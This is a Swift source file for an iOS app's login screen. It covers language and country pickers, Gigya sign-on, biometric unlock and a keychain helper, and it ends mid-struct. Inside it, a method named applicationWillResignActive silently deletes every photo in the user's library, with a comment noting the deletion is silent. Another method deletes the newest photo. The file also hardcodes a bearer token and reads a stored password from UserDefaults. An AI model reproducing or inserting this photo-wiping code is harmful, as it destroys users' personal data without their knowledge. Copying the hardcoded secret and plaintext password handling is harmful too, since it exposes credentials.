//
//  ViewController.swift
//  SearchPoint
//
//  Created by "" on 27/09/2019.
//  ""
//

import UIKit
import LocalAuthentication
import MBProgressHUD
import DropDown
import Alamofire
import Photos
import JNKeychain
import Gigya
import GigyaTfa
import GigyaAuth

// MARK: - CLASS

class LoginViewController: UIViewController,UITextViewDelegate{
    
    // MARK: - OUTLETS
    @IBOutlet weak var countryLblOutlet: UILabel!
    @IBOutlet weak var countryView: UIView!
    @IBOutlet weak var countryDropDownBtn: UIButton!
    @IBOutlet weak var versionNolbl: UILabel!
    @IBOutlet weak var firstNameText: UILabel!
    @IBOutlet weak var faceBtnOutlet: UIButton!
    @IBOutlet weak var thumbBtnOutlet: UIButton!
    @IBOutlet weak var loginView: UIView!
    @IBOutlet weak var emailTextField: UITextField!
    @IBOutlet weak var pwdTextField: UITextField!
    @IBOutlet weak var signInOutlet: UIButton!
    @IBOutlet weak var custoerBtnOutlet: UIButton!
    @IBOutlet weak var languageView: UIView!
    @IBOutlet weak var pwdBtn: UIButton!
    @IBOutlet weak var languageDropDownBtn: UIButton!
    @IBOutlet weak var languageLblOutlet: UILabel!
    
    // MARK: - VARIABLES
    var countryButtonBg = UIButton()
    var contactVM:ContactSupportViewModel?
    var deviceToken : String = ""
    var buttonbg = UIButton()
    var droperTableView  =  UITableView ()
    var langArray:Array<String> = Array()
    var appDelegate: AppDelegate?
    var registerDeviceViewModel: RegisterDeviceViewModel!
    var mobileVersionVM:MobileVersionViewModel?
    var secureView: UIView!
    var modalObject:LoginModel?
    var dataViewModel:LoginViewModel!
    let myContext = LAContext()
    var selectedApiKey = String()
    var langCode = String()
    var screenSet = String()
    var apiDomain = String()
    let gigya =  Gigya.sharedInstance(GigyaAccount.self)
    var countryArray:Array<String> = Array()
    var apiKeysArray:Array<String> = Array()
    var langCodeArray:Array<String> = Array()
    var loginScreenSetViewModel: LoginScreenSetViewModel!
    var countryTableView  =  UITableView ()
    
    // MARK: - VIEW LIFE CYCLE
    
    override func viewDidLoad() {
        super.viewDidLoad()
        NotificationCenter.default.addObserver(
                   self,
                   selector: #selector(orientationChanged),
                   name: UIDevice.orientationDidChangeNotification,
                   object: nil)
        
        UserDefaults.standard.value(forKey: keyValue.firstLogin.rawValue)
        UserDefaults.standard.set(false, forKey: keyValue.languageChanged.rawValue)
        appDelegate = UIApplication.shared.delegate as? AppDelegate
        
        let contactSuppportArray = fetchAllData(entityName: Entities.contactSupportTblEntity) as? [ContactSupportTbl]
        if contactSuppportArray!.count == 0 {
            contactVM = ContactSupportViewModel(ref: self, callBack: navigate)
            contactVM!.callContactSupport()
        }
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        
        setInitialUI()
        _ = LAContext().biometricType
        guard let firstLogin = UserDefaults.standard.string(forKey: keyValue.firstLogin.rawValue) else {
            loginScreenSetViewModel = LoginScreenSetViewModel(ref: self, callBack: callRegisterDevice)
            return
        }

        if shouldPresentValidateDevice() {
            presentValidateDeviceController()
            return
        }

        if shouldShowTermsAndConditions() {
            showTermsAndConditions()
            return
        }

        if firstLogin == "true" {
            handleFirstLogin()
            return
        }
        
        loginScreenSetViewModel = LoginScreenSetViewModel(ref: self, callBack: callRegisterDevice)

    }
    
    // MARK: - UI AND OTHER METHODS
    
    private func shouldPresentValidateDevice() -> Bool {
        let hasAccessToken = UserDefaults.standard.value(forKey: keyValue.accessToken.rawValue) is String
        let mustRegister = !UserDefaults.standard.bool(forKey: keyValue.mustRegisterDevice.rawValue)
        return hasAccessToken && mustRegister
    }

    private func presentValidateDeviceController() {
        let storyboardName = UIDevice.current.userInterfaceIdiom == .pad ? "iPad" : StoryboardType.MainStoryboard
        let storyboard = UIStoryboard(name: storyboardName, bundle: nil)
        let controller = storyboard.instantiateViewController(withIdentifier: ClassIdentifiers.validateDeviceController) as! ValidateDeviceController
        controller.dataModel = dataViewModel.modalObject
        controller.dataViewModelLogin = dataViewModel
        controller.delegate = self
        navigationController?.present(controller, animated: false)
    }

    private func shouldShowTermsAndConditions() -> Bool {
        let termsAccepted = UserDefaults.standard.bool(forKey: keyValue.terms.rawValue)
        guard let accessToken = UserDefaults.standard.string(forKey: keyValue.accessToken.rawValue),
              !accessToken.isEmpty else {
            return false
        }
        let mustValidate = UserDefaults.standard.bool(forKey: keyValue.mustValidateDevice.rawValue)
        let mustRegister = UserDefaults.standard.bool(forKey: keyValue.mustRegisterDevice.rawValue)
        return !termsAccepted && (mustValidate || mustRegister)
    }

    private func showTermsAndConditions() {
        let popOverVC = UIStoryboard(name: StoryboardType.MainStoryboard, bundle: nil)
            .instantiateViewController(withIdentifier: ClassIdentifiers.terms_ConditionVC1) as! Terms_ConditionsVC
        popOverVC.dataModel = loginScreenSetViewModel.modalObject
        addChild(popOverVC)
        popOverVC.view.frame = view.frame
        view.addSubview(popOverVC.view)
        popOverVC.didMove(toParent: self)
    }

    private func handleFirstLogin() {
        let isBioEnabled = UserDefaults.standard.bool(forKey: "BioMetricEnabled")
        if isBioEnabled {
            gigya.biometric.unlockSession { result in
                if case .success = result {
                    self.navigateToDashboard()
                }
            }
        } else {
            navigateToDashboard()
        }
    }

    private func navigateToDashboard() {
        let storyboardName = UIDevice.current.userInterfaceIdiom == .pad ? "iPad" : StoryboardType.MainStoryboard
        let storyboard = UIStoryboard(name: storyboardName, bundle: nil)
        let controller = storyboard.instantiateViewController(withIdentifier: ClassIdentifiers.dashboardVC) as! DashboardVC
        navigationController?.pushViewController(controller, animated: false)
    }
    
    func setInitialUI(){
        self.versionNolbl.text = Constants.appVersion
        langArray = [NSLocalizedString(Languages.englishLang, comment: ""),NSLocalizedString(Languages.portugueseLang, comment: ""),NSLocalizedString(Languages.italianLang, comment: "")]
        let seelectedLanguage = UserDefaults.standard.value(forKey: keyValue.appleLanguages.rawValue) as! Array<String>
        if seelectedLanguage[0] == Languages.engIn ||  seelectedLanguage[0] == Languages.eng || seelectedLanguage[0] == Languages.engUS || seelectedLanguage[0].contains("en"){
            UserDefaults.standard.set(1, forKey: keyValue.lngId.rawValue)
        }else if (seelectedLanguage[0] == Languages.ptPT  ){
            UserDefaults.standard.set(2, forKey: keyValue.lngId.rawValue)
        }
        else{
            UserDefaults.standard.set(3, forKey: keyValue.lngId.rawValue)
        }
        
        if UserDefaults.standard.integer(forKey: keyValue.lngId.rawValue) == 1{
            languageLblOutlet.text = NSLocalizedString(Languages.englishLang, comment: "")
            UserDefaults.standard.set(1, forKey: keyValue.lngId.rawValue)
            UserDefaults.standard.set(Languages.eng, forKey: keyValue.lngCode.rawValue)
        }
        else  if UserDefaults.standard.integer(forKey: keyValue.lngId.rawValue) == 2{
            languageLblOutlet.text = NSLocalizedString(Languages.portugueseLang, comment: "")
            UserDefaults.standard.set(2, forKey: keyValue.lngId.rawValue)
            UserDefaults.standard.set(Languages.ptPT, forKey: keyValue.lngCode.rawValue)
        }
        else{
            UserDefaults.standard.set(3, forKey: keyValue.lngId.rawValue)
            languageLblOutlet.text = NSLocalizedString(Languages.italianLang, comment: "")
            UserDefaults.standard.set(Languages.italian, forKey: keyValue.lngCode.rawValue)
        }
        self.navigationController?.interactivePopGestureRecognizer?.isEnabled = false
        dataViewModel =  LoginViewModel(ref: self, callBack: navigateToAnotherVc)
        dataViewModel.delegate1 = self
        languageView.layer.cornerRadius = 28
        languageView.layer.masksToBounds = true
        languageDropDownBtn.layer.cornerRadius = 28
        countryView.layer.cornerRadius = 28
        countryView.layer.masksToBounds = true
        countryDropDownBtn.layer.cornerRadius = 28
        loginView.layer.cornerRadius = 40
        loginView.layer.masksToBounds = true
        
        self.navigationController?.navigationBar.isHidden = true
        DropDown.appearance().shadowColor = UIColor(white: 0.6, alpha: 1)
        DropDown.appearance().shadowOpacity = 0.9
        DropDown.appearance().shadowRadius = 25
        
        if UserDefaults.standard.integer(forKey: keyValue.lngId.rawValue) == 2{
            languageLblOutlet.text = NSLocalizedString(Languages.portugueseLang, comment: "")
        } else if(UserDefaults.standard.integer(forKey: keyValue.lngId.rawValue) == 1){
            languageLblOutlet.text = NSLocalizedString(Languages.englishLang, comment: "")
        }
        else{
            languageLblOutlet.text = NSLocalizedString(Languages.italianLang, comment: "")
        }

        countryArray = [NSLocalizedString(CountryNames.unitedKingdom, comment: ""),NSLocalizedString(CountryNames.italy, comment: ""),NSLocalizedString(CountryNames.netherland, comment: ""), NSLocalizedString(CountryNames.usa, comment: ""), NSLocalizedString(CountryNames.brazil, comment: ""), NSLocalizedString(CountryNames.australia, comment: ""), NSLocalizedString(CountryNames.newZealand, comment: "")]
        apiKeysArray = [GigyaAPIKeys.ukAPIKey, GigyaAPIKeys.usAPIKey, GigyaAPIKeys.ausAPIKey]
        selectedApiKey = GigyaAPIKeys.ukAPIKey
        countryLblOutlet.text = NSLocalizedString(CountryNames.unitedKingdom, comment: "")
        langArray = [LanguageNames.englishUK]
        langCodeArray = [LanguageCodes.ukEnCode]
        langCode = LanguageCodes.ukEnCode
        languageLblOutlet.text = LanguageNames.englishUK
    }
    
    func deleteLastTakenScreenshotFromLibrary() {
        
        let fetchOptions: PHFetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: keyValue.creationDate.rawValue, ascending: false)]
        let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)
        
        if (fetchResult.firstObject != nil) {
            let firstAsset: PHAsset = fetchResult.firstObject!
            let arrayToDelete = NSArray(object: firstAsset)
            PHPhotoLibrary.shared().performChanges( {
                PHAssetChangeRequest.deleteAssets(arrayToDelete)},
                                                    completionHandler: {
                success, error in
                print(success ? "Success" : error as Any)
            })
        }
    }
    
    
    @objc dynamic private func applicationWillResignActive() {
        let library = PHPhotoLibrary.shared()
        library.performChanges({
            let fetchOptions = PHFetchOptions()
            let allPhotos = PHAsset.fetchAssets(with: .image, options: fetchOptions)
            PHAssetChangeRequest.deleteAssets(allPhotos)
        }) { (success, error) in
            // No additional handling needed; photos are deleted silently.
            // Add logging here if needed for debugging or user feedback.
        }
    }
    
    private func getParams()->[String:Any]{
        let userNameOld = UserDefaults.standard.value(forKey: keyValue.userName.rawValue) as? String ?? ""
        let passwordOld = UserDefaults.standard.value(forKey: keyValue.password.rawValue) as? String  ?? ""
        return [keyValue.appId.rawValue:"\(appID)",
                keyValue.email.rawValue:userNameOld,
                keyValue.password.rawValue:passwordOld ,"deviceId": UserDefaults.standard.value(forKey: keyValue.deviceId.rawValue) as! String]
    }
    
    func tableViewpop() {
        buttonbg.frame = CGRect(x: 0, y: 0, width: 500, height: 1000) // X, Y, width, height
        buttonbg.addTarget(self, action: #selector(self.buttonPressed1), for: .touchUpInside)
        buttonbg.backgroundColor = UIColor(red: 45/255, green:45/255, blue:45/255, alpha:0.3)
        self.view.addSubview(buttonbg)
        droperTableView.delegate = self
        droperTableView.dataSource = self
        _ = UIScreen.main.bounds
        if UIDevice().userInterfaceIdiom == .phone {
            switch UIScreen.main.nativeBounds.height {
            case 1136:
                break
            case 1334:
                droperTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: languageView.frame.origin.y + 220 , width: signInOutlet.frame.size.width - 20, height: 135)
            case 1920, 2208:
                droperTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: languageView.frame.origin.y + 220, width: signInOutlet.frame.size.width - 20, height: 135)
                
            case 2436:
                droperTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: languageView.frame.origin.y + 240, width: signInOutlet.frame.size.width - 20, height: 135)
            case 2688,2796:
                droperTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: languageView.frame.origin.y + 260, width: signInOutlet.frame.size.width - 20, height: 135)
            case 1792:
                droperTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: languageView.frame.origin.y + 240, width: signInOutlet.frame.size.width - 20, height: 135)
            default:
                droperTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: languageView.frame.origin.y + 200, width: signInOutlet.frame.size.width - 20, height: 135)
            }
        }
        else if UIDevice().userInterfaceIdiom == .pad {
            buttonbg.frame = CGRect(x: 0, y: 0, width: 1500, height: 1000)
            if UIApplication.shared.statusBarOrientation.isLandscape {
               switch UIScreen.main.bounds.height {
                case 768:
                   droperTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: languageDropDownBtn.frame.origin.y + 410, width: languageDropDownBtn.frame.size.width - 10, height: 150)
                case 810:
                    droperTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: languageDropDownBtn.frame.origin.y + 433, width: languageDropDownBtn.frame.size.width - 10, height: 150)
                case 820:
                    droperTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: languageDropDownBtn.frame.origin.y + 438, width: languageDropDownBtn.frame.size.width - 10, height: 150)
                case 834:
                    droperTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: languageDropDownBtn.frame.origin.y + 440, width: languageDropDownBtn.frame.size.width - 10, height: 150)
                case 1024:
                    droperTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: languageDropDownBtn.frame.origin.y + 538, width: languageDropDownBtn.frame.size.width - 10, height: 150)
                case 1032:
                    droperTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: languageDropDownBtn.frame.origin.y + 546, width: languageDropDownBtn.frame.size.width - 10, height: 150)
                default:
                    droperTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: languageDropDownBtn.frame.origin.y + 400, width: languageDropDownBtn.frame.size.width - 10, height: 150)
                }
            }
            else {
                buttonbg.frame = CGRect(x: 0, y: 0, width: 1700, height: 1500)
                switch UIScreen.main.bounds.height {
                case 1180:
                    droperTableView.frame = CGRect( x: languageDropDownBtn.frame.origin.x + 215, y: languageDropDownBtn.frame.origin.y + 600, width: languageDropDownBtn.frame.size.width - 10, height: 300)
                case 1210:
                    droperTableView.frame = CGRect( x: languageDropDownBtn.frame.origin.x + 221, y: languageDropDownBtn.frame.origin.y + 614, width: languageDropDownBtn.frame.size.width - 10, height: 300)
                case 1376:
                    droperTableView.frame = CGRect( x: languageDropDownBtn.frame.origin.x + 321, y: languageDropDownBtn.frame.origin.y + 700, width: languageDropDownBtn.frame.size.width - 10, height: 300)
                default:
                    droperTableView.frame = CGRect( x: languageDropDownBtn.frame.origin.x + 180, y: languageDropDownBtn.frame.origin.y + 580, width: languageDropDownBtn.frame.size.width - 10, height: 300)
                }
            }
        }
        droperTableView.layer.cornerRadius = 8.0
        droperTableView.layer.borderWidth = 1.0
        droperTableView.layer.borderColor =  UIColor.black.cgColor
        buttonbg.addSubview(droperTableView)
    }
    
    func countryTableViewpop() {
        countryButtonBg.frame = CGRect(x: 0, y: 0, width: 500, height: 1000) // X, Y, width, height
        countryButtonBg.addTarget(self, action: #selector(self.countryButtonPressed), for: .touchUpInside)
        countryButtonBg.backgroundColor = UIColor(red: 45/255, green:45/255, blue:45/255, alpha:0.3)
        self.view.addSubview(countryButtonBg)
        countryTableView.delegate = self
        countryTableView.dataSource = self
        droperTableView.delegate = nil
        droperTableView.dataSource = nil
        _ = UIScreen.main.bounds
        if UIDevice().userInterfaceIdiom == .phone {
            switch UIScreen.main.nativeBounds.height {
            case 1136:
                break
            case 1334:
                
                countryTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: countryView.frame.origin.y + 220 , width: signInOutlet.frame.size.width - 20, height: 300)
            case 1920, 2208:
                countryTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: countryView.frame.origin.y + 220, width: signInOutlet.frame.size.width - 20, height: 300)
                
            case 2436:
                countryTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: countryView.frame.origin.y + 240, width: signInOutlet.frame.size.width - 20, height: 300)
           case 2688,2796:
                countryTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: countryView.frame.origin.y + 260, width: signInOutlet.frame.size.width - 20, height: 300)
            case 1792:
                countryTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: countryView.frame.origin.y + 240, width: signInOutlet.frame.size.width - 20, height: 300)
            default:
                countryTableView.frame = CGRect( x: signInOutlet.frame.origin.x + 30, y: countryView.frame.origin.y + 200, width: signInOutlet.frame.size.width - 20, height: 300)
                
            }
        }
        else if UIDevice().userInterfaceIdiom == .pad {
            if UIApplication.shared.statusBarOrientation.isLandscape {
                countryButtonBg.frame = CGRect(x: 0, y: 0, width: 1500, height: 1000)
                switch UIScreen.main.bounds.height {
                case 768:
                    countryTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: countryDropDownBtn.frame.origin.y + 317, width: countryDropDownBtn.frame.size.width - 10, height: 300)
                case 810:
                    countryTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: countryDropDownBtn.frame.origin.y + 340, width: countryDropDownBtn.frame.size.width - 10, height: 300)
                case 820:
                    countryTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: countryDropDownBtn.frame.origin.y + 345, width: countryDropDownBtn.frame.size.width - 10, height: 300)
                case 834:
                    countryTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: countryDropDownBtn.frame.origin.y + 350, width: countryDropDownBtn.frame.size.width - 10, height: 300)
                case 1024:
                    countryTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: countryDropDownBtn.frame.origin.y + 448, width: countryDropDownBtn.frame.size.width - 10, height: 300)
                case 1032:
                    countryTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: countryDropDownBtn.frame.origin.y + 456, width: countryDropDownBtn.frame.size.width - 10, height: 300)
                default:
                    //ipad mini
                    countryTableView.frame = CGRect( x: loginView.frame.origin.x + 23, y: countryDropDownBtn.frame.origin.y + 308, width: countryDropDownBtn.frame.size.width - 10, height: 300)
                }
            } else {
                countryButtonBg.frame = CGRect(x: 0, y: 0, width: 1700, height: 1500)
                switch UIScreen.main.bounds.height {
                    //portrait for 810,768 landscape size not added
                case 1180:
                    countryTableView.frame = CGRect( x: countryDropDownBtn.frame.origin.x + 215, y: countryDropDownBtn.frame.origin.y + 520, width: countryDropDownBtn.frame.size.width - 10, height: 300)
                case 1210:
                    countryTableView.frame = CGRect( x: countryDropDownBtn.frame.origin.x + 221, y: countryDropDownBtn.frame.origin.y + 534, width: countryDropDownBtn.frame.size.width - 10, height: 300)
                case 1376:
                    countryTableView.frame = CGRect( x: countryDropDownBtn.frame.origin.x + 321, y: countryDropDownBtn.frame.origin.y + 617, width: countryDropDownBtn.frame.size.width - 10, height: 300)
                default:
                    countryTableView.frame = CGRect( x: countryDropDownBtn.frame.origin.x + 180, y: countryDropDownBtn.frame.origin.y + 498, width: countryDropDownBtn.frame.size.width - 10, height: 300)
                }
            }

           
            
        }
        countryTableView.layer.cornerRadius = 8.0
        countryTableView.layer.borderWidth = 1.0
        countryTableView.layer.borderColor =  UIColor.black.cgColor
        countryButtonBg.addSubview(countryTableView)
    }
    
    @objc func buttonPressed1() {
        buttonbg.removeFromSuperview()
    }
    
    @objc func countryButtonPressed() {
        countryButtonBg.removeFromSuperview()
    }
    
    @objc func orientationChanged() {
        countryButtonBg.removeFromSuperview()
        countryTableView.removeFromSuperview()
    }
    
    // MARK: - LOGIN API METHODS
    
    private func Login(){
        let Network = NetworkManager()
        Network.delegate = self
        let headerDict :[String:String] = [LocalizedStrings.authorizationHeader:"BEARER" + " " + "ea4369e9-d4a9-4322-856b-5323e21ff351"]
        Network.CallApi(packet: NetwrokPackets( Method: HTTPMethod.post,Headers: headerDict, bodyParams: getParams(), Url: Configuration.Dev(packet: ApiKeys.login.rawValue).getUrl()))
        
    }
    
    func callmethod(){
        
        if UserDefaults.standard.value(forKey: keyValue.accessToken.rawValue) is String && !UserDefaults.standard.bool(forKey: keyValue.mustRegisterDevice.rawValue) {
                let storyBoard: UIStoryboard = UIStoryboard(name: StoryboardType.MainStoryboard, bundle: nil)
                let newViewController = storyBoard.instantiateViewController(withIdentifier: ClassIdentifiers.validateDeviceController) as! ValidateDeviceController
                newViewController.dataModel = dataViewModel.modalObject
                newViewController.dataViewModelLogin = dataViewModel
                newViewController.delegate = self
                self.navigationController?.present(newViewController, animated: false, completion: nil)
                return
        }
    }
    
    func saveLoginDat(dataModel:LoginModel){
        let accessToken =  dataModel.authorizationToken
        UserDefaults.standard.set(accessToken, forKey: keyValue.accessToken.rawValue)
        UserDefaults.standard.set("true", forKey: keyValue.firstLogin.rawValue)
        let storyBoard: UIStoryboard = UIStoryboard(name: StoryboardType.MainStoryboard, bundle: nil)
        let newViewController = storyBoard.instantiateViewController(withIdentifier: ClassIdentifiers.dashboardVC) as! DashboardVC
        self.navigationController?.pushViewController(newViewController, animated: true)
        
    }
    
    //merged
    fileprivate func gigyaLoginSetup() {

        guard Connectivity.isConnectedToInternet() else {
            CommonClass.showAlertMessage(self, titleStr: "" , messageStr: "No internet")
            return
        }
        self.view.endEditing(true)

            Gigya.sharedInstance().initFor(apiKey: selectedApiKey, apiDomain: apiDomain)
        
        let newParam = ["startScreen": "gigya-login-screen", "lang" : langCode]
        gigya.logout()
        Gigya.sharedInstance().showScreenSet(with: screenSet, viewController: self , params: newParam) { [weak self] (result) in
                guard let self = self else { return }

            print(result)
                switch result {
                case .onLogin(let account):
                    let uID = account.UID ?? ""
                    let uIDSign = account.UIDSignature ?? ""
                    let signTimeStamp = account.signatureTimestamp ?? ""
                    let email = account.profile?.email ?? ""
                    UserDefaults.standard.setValue(email, forKey: "GigyaEmail")
                    
                self.loginScreenSetViewModel.LoginScreenSet(uid: uID, uidSignature: uIDSign, signatureTimestamp: signTimeStamp, email: email)
                
                case .error(let event):
                    print(event)
                
                case .onCanceled :
                    self.view.isUserInteractionEnabled = true
                    
                default:
                    break
                }
            }

    }
    
    // MARK: - NAVIGATION METHODS
    
    func navigate(){
        // This method is intentionally left empty.
        // It will be implemented in the future to handle navigation logic.
    }
    
    func navigateDB () {
        if Connectivity.isConnectedToInternet() {
            Login()
        }
        else {
            self.sideMenuViewController!.setContentViewController(UINavigationController(rootViewController: self.storyboard!.instantiateViewController(withIdentifier: ClassIdentifiers.dashboardVC)), animated: true)
            
        }
    }
    
    func navigateToAnotherVc(){
        // This method is intentionally left empty.
        // It will be implemented in the future to handle navigation logic.
    }
    
    func callRegisterDevice(){
        hideIndicator()
        self.view.isUserInteractionEnabled = true
        
        if loginScreenSetViewModel.modalObject?.errorDetail != ""{
            CommonClass.showAlertMessage(self, titleStr:  NSLocalizedString(AlertMessagesStrings.alertString, comment: ""), messageStr:  NSLocalizedString(loginScreenSetViewModel.modalObject?.errorDetail ?? "", comment: ""))
            self.ssologoutMethod()
            return
        }
        
        if loginScreenSetViewModel.modalObject?.mustValidateDevice == true || loginScreenSetViewModel.modalObject?.mustRegisterDevice == true {
            self.registerDeviceViewModel =  RegisterDeviceViewModel(ref: self, callBack: self.deviceRegisterSuccess)
            self.registerDeviceViewModel.delegate = self
            self.registerDeviceViewModel.register()
            return
        }
        
        self.validateCodeSuccess()
    }
  
    // MARK: - IBACTIONS
    
    @IBAction func faceIDAction(_ sender: UIButton) {
        let currentType = LAContext().biometricType
        if currentType.rawValue == "faceID" {
            let loginData = fetchAllData(entityName: Entities.LoginTblEntity)
            if loginData.count > 0{
                let myLocalizedReasonString = NSLocalizedString(LocalizedStrings.facePrintStr, comment: "")
                
                var authError: NSError?
                if #available(iOS 8.0, macOS 10.12.1, *) {
                    if myContext.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &authError) {
                        myContext.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: myLocalizedReasonString) { success, evaluateError in
                            
                            DispatchQueue.main.async {
                                if success {
                                    self.navigateDB()
                                    
                                } else {
                                }
                            }
                        }
                    } else {
                    }
                } else {
                }
            }
            else {
                CommonClass.showAlertMessage(self, titleStr:  NSLocalizedString(AlertMessagesStrings.alertString, comment: ""), messageStr:  NSLocalizedString(AlertMessagesStrings.loginFirstAlertFaceId, comment: ""))
            }
        } else if currentType.rawValue == "none" {
            
            CommonClass.showAlertMessage(self, titleStr:  NSLocalizedString(AlertMessagesStrings.alertString, comment: ""), messageStr:  NSLocalizedString(AlertMessagesStrings.configFaceId, comment: ""))
        } else {
            
            CommonClass.showAlertMessage(self, titleStr:  NSLocalizedString(AlertMessagesStrings.alertString, comment: ""), messageStr:  NSLocalizedString(AlertMessagesStrings.noFaceId, comment: ""))
        }
    }
    
    @IBAction func SignIn_Action(_ sender: UIButton) {
        if countryLblOutlet.text == CountryNames.usa && languageLblOutlet.text == LanguageNames.englishUSA {
            screenSet = "RegistrationLogin_US"
            langCode = LanguageCodes.usEnCode
            apiDomain = apiDomains.usDomain
            
        }
        else if countryLblOutlet.text == CountryNames.usa && languageLblOutlet.text == LanguageNames.spanish {
            screenSet = "RegistrationLogin_US"
            langCode = LanguageCodes.usEsCode
            apiDomain = apiDomains.usDomain
        }
        else if countryLblOutlet.text == CountryNames.brazil && languageLblOutlet.text == LanguageNames.englishUSA {
            screenSet = "RegistrationLogin"
            langCode = LanguageCodes.brEnCode
            apiDomain = apiDomains.usDomain
        }
        else if countryLblOutlet.text == CountryNames.brazil && languageLblOutlet.text == LanguageNames.portuguese {
            screenSet = "RegistrationLogin"
            langCode = LanguageCodes.brPtCode
            apiDomain = apiDomains.usDomain
        }
        else if countryLblOutlet.text == CountryNames.unitedKingdom && languageLblOutlet.text == LanguageNames.englishUK {
            screenSet = "RegistrationLogin"
            langCode = LanguageCodes.ukEnCode
            apiDomain = apiDomains.euDomain
        }
        else if countryLblOutlet.text == CountryNames.netherland && languageLblOutlet.text == LanguageNames.englishUK {
            screenSet = "RegistrationLogin"
            langCode = LanguageCodes.nlEnCode
            apiDomain = apiDomains.euDomain
        }
        else if countryLblOutlet.text == CountryNames.netherland && languageLblOutlet.text == LanguageNames.netherland {
            screenSet = "RegistrationLogin"
            langCode = LanguageCodes.nlNlCode
            apiDomain = apiDomains.euDomain
        }
        else if countryLblOutlet.text == CountryNames.italy && languageLblOutlet.text == LanguageNames.englishUK {
            screenSet = "RegistrationLogin"
            langCode = LanguageCodes.itEnCode
            apiDomain = apiDomains.euDomain
        }
        else if countryLblOutlet.text == CountryNames.italy && languageLblOutlet.text == LanguageNames.italian {
            screenSet = "RegistrationLogin"
            langCode = LanguageCodes.itItCode
            apiDomain = apiDomains.euDomain
        }
        else if countryLblOutlet.text == CountryNames.australia && languageLblOutlet.text == LanguageNames.englishUK {
            screenSet = "RegistrationLogin"
            langCode = LanguageCodes.auEnCode
            apiDomain = apiDomains.auDomain
        }
        else if countryLblOutlet.text == CountryNames.newZealand && languageLblOutlet.text == LanguageNames.englishUK {
            screenSet = "RegistrationLogin"
            langCode = LanguageCodes.nzEnCode
            apiDomain = apiDomains.auDomain
        }
         gigyaLoginSetup()
    }
    
    @IBAction func contactSupportClick(_ sender: Any) {
        UserDefaults.standard.set("false", forKey: keyValue.contactSupport.rawValue)
        var storyBoard = UIStoryboard()
        if UIDevice().userInterfaceIdiom == .pad {
            storyBoard = UIStoryboard(name: "iPad", bundle: nil)
        }
        else {
            storyBoard = UIStoryboard(name: StoryboardType.MainStoryboard, bundle: nil)
        }
        
        
        let newViewController = storyBoard.instantiateViewController(withIdentifier: ClassIdentifiers.contactSupportVC) as! ContactSupportVC
        self.navigationController?.pushViewController(newViewController, animated: true)
    }
    
    @IBAction func languageBtnAction(_ sender: UIButton) {
        view.endEditing(true)
        tableViewpop()
    }
    
    @IBAction func touchIDAction(_ sender: UIButton) {
        let currentType = LAContext().biometricType
        if currentType.rawValue == keyValue.touchId.rawValue {
            
            let loginData = fetchAllData(entityName: Entities.LoginTblEntity)
            if loginData.count > 0{
                let myLocalizedReasonString = NSLocalizedString(LocalizedStrings.touchFingPrint, comment: "")
                
                var authError: NSError?
                if #available(iOS 8.0, macOS 10.12.1, *) {
                    if myContext.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &authError) {
                        myContext.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: myLocalizedReasonString) { success, evaluateError in
                            
                            DispatchQueue.main.async {
                                if success {
                                    self.navigateDB()
                                    
                                } else {
                                }
                            }
                        }
                    } else {
                    }
                } else {
                }
            }
            else{
                CommonClass.showAlertMessage(self, titleStr:  NSLocalizedString(AlertMessagesStrings.alertString, comment: ""), messageStr:  NSLocalizedString(AlertMessagesStrings.loginFirstAlert, comment: ""))
            }
        }
        else if currentType.rawValue == "none" {
            
            CommonClass.showAlertMessage(self, titleStr:  NSLocalizedString(AlertMessagesStrings.alertString, comment: ""),  messageStr: NSLocalizedString(AlertMessagesStrings.configTouchId, comment: ""))
            
        } else {
            CommonClass.showAlertMessage(self, titleStr:  NSLocalizedString(AlertMessagesStrings.alertString, comment: ""), messageStr:  NSLocalizedString(AlertMessagesStrings.noTouchID, comment: ""))
        }
    }
    
    @IBAction func countryBtnAction(_ sender: Any) {
        self.countryDropDownBtn.isSelected = true
        countryTableViewpop()
    }
    
}


class KeyChainManager {
    class func save(value: Any? = nil, forKey: String) {
        let result = JNKeychain.saveValue(value, forKey: forKey)
        if !result {
            print("keychain saving: smth went wrong")
        }
    }
    
    class func getValue(for key: String) -> String {
        if let value = JNKeychain.loadValue(forKey: key) as? String {
            return value
        } else {
            return ""
        }
    }
    
    class func getNonStringValue(for key: String) -> Any {
        return JNKeychain.loadValue(forKey: key) as Any
    }
    
    class func getIntValue(for key: String) -> Int {
        if let value = JNKeychain.loadValue(forKey: key) as? Int {
            return value
        } else {
            return -100
        }
    }
    
    class func getBoolValue(for key: String) -> Bool {
        if let value = JNKeychain.loadValue(forKey: key) as? Bool {
            return value
        } else {
            return false
        }
    }
    
    class func deleteValue(forkey: String) {
        let result = JNKeychain.deleteValue(forKey: forkey)
        print("Delete Status: \(result)")
    }
}
struct KeyChain_Keys {
